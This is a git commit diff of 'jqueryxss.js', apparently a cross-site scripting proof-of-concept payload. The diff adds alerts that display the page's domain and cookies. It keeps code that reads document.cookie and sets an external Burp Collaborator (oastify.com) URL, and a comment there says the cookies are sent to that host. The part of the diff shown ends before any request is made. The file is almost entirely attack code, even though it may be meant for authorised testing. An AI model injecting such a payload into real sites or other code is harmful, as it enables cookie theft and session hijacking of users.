9000d91667089562abf498dd514fd6ca7fe8b7f1
Shad0w-Eagle <167417449+Shad0w-Eagle@users.noreply.github.com>
2025-01-20 17:49:56 +0530

    Update jqueryxss.js

--- jqueryxss.js
+++ jqueryxss.js
@@ -1,7 +1,11 @@
-alert(document.cookies);
+// Display the current domain in an alert
+alert("Domain: " + document.domain);
 
 // Fetch the cookies
 var cookies = document.cookie;
+
+// Display the cookies in an alert
+alert("Cookies: " + cookies);
 
 // Send the cookies to your Burp Collaborator URL
 var burpCollaboratorURL = "https://mh7587gmzgcs1acch9zst61o7fd618px.oastify.com"; // Replace with your actual Burp Collaborator URL
